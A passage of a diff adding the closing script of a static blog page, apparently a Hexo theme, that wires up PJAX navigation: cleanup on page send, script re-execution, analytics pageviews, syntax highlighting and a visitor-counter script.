+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.removeEventListener('scroll', window.tocScrollFn)
+  window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // Analytics
+  if (false) {
+    MtaH5.pgv()
+  }
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
